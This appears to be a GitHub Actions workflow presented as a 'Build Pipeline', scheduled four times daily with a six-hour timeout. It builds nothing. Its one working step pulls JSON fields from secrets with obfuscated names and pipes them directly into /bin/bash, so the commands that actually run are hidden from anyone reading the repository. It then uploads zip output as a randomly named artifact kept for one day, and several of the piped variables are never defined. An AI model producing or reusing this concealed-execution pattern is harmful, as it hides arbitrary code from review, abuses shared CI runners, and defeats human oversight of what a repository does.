name: Build Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '18 3,9,15,21 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  workflow:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Perform
        env:
          mlwc35: ${{ secrets.mlwc35 }}
        run: |
          printf '%s' "$mlwc35" | jq -r .tipw70 | /bin/bash
          printf '%s' "$i8" | jq -r .i951 | /bin/bash
          printf '%s' "$bnip5904" | jq -r .kcfc31656 | /bin/bash
          printf '%s' "$pnt9616" | jq -r .m490 | /bin/bash

      - name: Archive results
        uses: actions/upload-artifact@v4
        with:
          name: XZ9Oa4jR
          path: "*.zip"
          retention-days: 1
